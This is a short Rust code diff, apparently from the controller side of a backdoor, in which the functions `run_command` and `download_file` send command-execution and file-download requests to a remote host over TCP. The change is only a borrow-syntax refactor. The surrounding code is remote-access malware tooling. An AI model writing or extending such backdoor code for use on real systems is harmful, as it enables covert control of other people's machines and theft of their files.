@@ -26,7 +26,7 @@ pub fn send_request(
 
 pub fn run_command(
     command: String,
-    mut stream: &mut TcpStream,
+    stream: &mut TcpStream,
 ) -> Result<RunCommandResponse, ErrorInfo> {
     println!("Running command {} through backdoor.", command);
     let req = RunCommandRequest {
@@ -35,7 +35,7 @@ pub fn run_command(
     };
     send_request(req, stream).expect("Could not send request");
 
-    let response = get_message(&mut stream).expect("Could not get message from stream");
+    let response = get_message(&stream).expect("Could not get message from stream");
     if response.message_type != MessageTypes::RunCommandResponse as u8 {
         panic!(format!(
             "Got unexpected response type {}",
@@ -55,11 +55,11 @@ pub fn run_command(
     }
 }
 
-pub fn download_file(remote_path: String, _local_path: String, mut stream: &mut TcpStream) {
+pub fn download_file(remote_path: String, _local_path: String, stream: &mut TcpStream) {
     let req = DownloadFileRequest { path: remote_path };
     send_request(req, stream).expect("Could not send request");
 
-    let response = get_message(&mut stream).expect("Could not get message from stream");
+    let response = get_message(&stream).expect("Could not get message from stream");
     if response.message_type != MessageTypes::DownloadFileResponse as u8 {
         panic!(format!(
             "Got unexpected response type {}",
